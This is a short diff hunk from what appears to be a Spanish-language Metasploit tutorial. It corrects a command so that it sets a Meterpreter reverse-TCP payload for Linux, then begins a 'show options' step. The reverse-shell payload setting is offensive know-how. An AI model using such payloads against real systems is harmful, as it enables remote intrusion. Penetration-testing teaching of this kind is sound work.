@@ -70,7 +70,7 @@ Tenemos mucha diversidad.
 
 Vamos a usar un ***Meterpreter***.
 ```
-use linux/x86/meterpreter/reverse_tcp
+set payload linux/x86/meterpreter/reverse_tcp
 ```
 ```
 show options
